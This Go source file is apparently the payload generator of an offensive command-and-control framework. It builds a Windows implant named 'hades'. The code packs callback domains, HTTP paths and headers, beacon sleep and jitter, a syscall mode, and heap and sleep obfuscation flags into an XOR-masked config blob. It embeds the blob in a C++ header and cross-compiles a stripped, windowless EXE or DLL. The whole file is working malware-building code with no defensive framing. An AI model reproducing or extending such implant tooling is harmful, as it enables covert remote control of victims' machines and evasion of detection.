package hadesgen


import (
	"bytes"
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"os/exec"
	"os"
	"path/filepath"
	"strings"
	"unicode/utf16"

	"github.com/z3vxo/kronos/internal/database"
)

// this file wll be changed alot as the implant grows
// right now its the bare minimum for testing


func formatBytesAsHex(data []byte) string {
	var sb strings.Builder
	sb.WriteByte('"')
	for _, b := range data {
		fmt.Fprintf(&sb, "\\x%02x", b)
	}
	sb.WriteByte('"')
	return sb.String()
}

func longestDomain(domains []database.ProfileDomain) int {
	longest := 0
	for _, entry := range domains {
		l := MultiByteLength(entry.Domain)
		if l > longest {
			longest = l
		}
	}
	return longest
}

func MultiByteLength(val string) int {
	return len(utf16.Encode([]rune(val))) + 1
}


func writeU32(buf *bytes.Buffer, val uint32) {
	binary.Write(buf, binary.LittleEndian, val)
}

func writeString(buf *bytes.Buffer, s string) {
	writeU32(buf, uint32(len(s)+1))
	buf.WriteString(s)
	buf.WriteByte(0)
}



func boolToU32(b bool) uint32 {
	if b {
		return 1
	}
	return 0
}

func buildHeaderString(headers []database.ProfileHeader) string {
	var sb strings.Builder
	for _, h := range headers {
		sb.WriteString(h.Key)
		sb.WriteString(": ")
		sb.WriteString(h.Value)
		sb.WriteString("\r\n")
	}
	sb.WriteString("\r\n")
	return sb.String()
}

func CraftProfileBytes(prof database.Profile) ([]byte, error) {
	buf := new(bytes.Buffer)

	writeU32(buf, prof.Payload_id)

	writeU32(buf, uint32(len(prof.Domains)))
	for _, d := range prof.Domains {
		writeString(buf, d.Domain)
		writeU32(buf, uint32(d.Port))
		writeU32(buf, boolToU32(d.IsHttps))
	}

	writeString(buf, prof.Get)
	writeString(buf, prof.Post)

	headerStr := buildHeaderString(prof.Headers)
	writeString(buf, headerStr)

	writeU32(buf, uint32(prof.Sleep))
	writeU32(buf, uint32(prof.Jitter))

	writeU32(buf, uint32(prof.Syscall))
	writeU32(buf, boolToU32(prof.HeapObf))
	writeU32(buf, boolToU32(prof.SleepObf))

	buf.Write(prof.Key)
	profile := buf.Bytes()

	var xorKey [4]byte
	rand.Read(xorKey[:])

	for i := range profile {
		profile[i] ^= xorKey[i%4]
	}

	out := new(bytes.Buffer)
	out.Write(xorKey[:])
	out.Write(profile)

	return out.Bytes(), nil
}


func GeneratePayload(profile database.Profile, name, format string, debug bool) (string, error) {

	home, _ := os.UserHomeDir()
	base := filepath.Join(home, ".kronos", "payload", "implant", "hades")
	tmplPath := filepath.Join(base, "config.hpp.tmpl")
	outPath := filepath.Join(base, "config.hpp")

	content, err := os.ReadFile(tmplPath)
	if err != nil {
		return "", err
	}

	profileData, err := CraftProfileBytes(profile)
	if err != nil {
		return "", err
	}

	domainCount := len(profile.Domains)
	domainBufLen := longestDomain(profile.Domains)
	getLen := MultiByteLength(profile.Get)
	postLen := MultiByteLength(profile.Post)
	headerStr := buildHeaderString(profile.Headers)
	headersLen := MultiByteLength(headerStr)

	result := string(content)
	result = strings.Replace(result, "REPLACE_COUNT_MARKER", fmt.Sprintf("%d", domainCount), 1)
	result = strings.Replace(result, "REPLACE_LEN_MARKER", fmt.Sprintf("%d", domainBufLen), 1)
	result = strings.Replace(result, "REPLACE_GET_MARKER", fmt.Sprintf("%d", getLen), 1)
	result = strings.Replace(result, "REPLACE_POST_MARKER", fmt.Sprintf("%d", postLen), 1)
	result = strings.Replace(result, "REPLACE_HEADER_LEN_MARKER", fmt.Sprintf("%d", headersLen), 1)

	profileHex := formatBytesAsHex(profileData)
	result = strings.Replace(result, `"REPLACE_PROFILE_DATA_MARKER"`, profileHex, 1)
	result = strings.Replace(result, "REPLACE_PROF_LEN_MARKER", fmt.Sprintf("%d", len(profileData)), 1)

	if err = os.WriteFile(outPath, []byte(result), 0644); err != nil {
		return "", err
	}

	
	out, err := Compile(name, format, debug) 
	if err != nil {
		return "", err
	}

	return out, nil
}


func Compile(name, format string, debug bool) (string, error) {
	home, _ := os.UserHomeDir()
	srcDir := filepath.Join(home, ".kronos", "payload", "implant")


	outPath := fmt.Sprintf("/tmp/%s.%s", name, format)

	args := []string{
		"x86_64-w64-mingw32-c++",
		"-o", outPath,
		"main.cpp",
		"hades/hades.cpp",
		"hades/init.cpp",
		"hades/config.cpp",
		"utils/bytes.cpp",
		"utils/api.cpp",
		"fileops/files.cpp",
		"cmds/dispatch.cpp",
		"cmds/filesystem.cpp",
		"cmds/process.cpp",
		"cmds/files.cpp",
		"cmds/misc.cpp",
		"cmds/tokens.cpp",
		"networkd/network.cpp",
		"-I", ".",
		"-static", "-std=c++17",
	}

	switch format {
	case "dll":
		args = append(args, "-shared", "-DBUILD_DLL", "-lkernel32")
	default:
		args = append(args, "-DBUILD_EXE", "-lkernel32", "-lmsvcrt")
	}

	if debug {
		args = append(args, "-D_DEBUG", "-O0")
	} else {
		args = append(args, "-O2", "-s", "-mwindows")
	}

	cmd := exec.Command(args[0], args[1:]...)
	cmd.Dir = srcDir

	output, err := cmd.CombinedOutput()
	if err != nil {
		logPath := filepath.Join(srcDir, "error.log")
		os.WriteFile(logPath, output, 0644)
		return "", fmt.Errorf("compilation failed, see %s", logPath)
	}

	return outPath, nil

	
}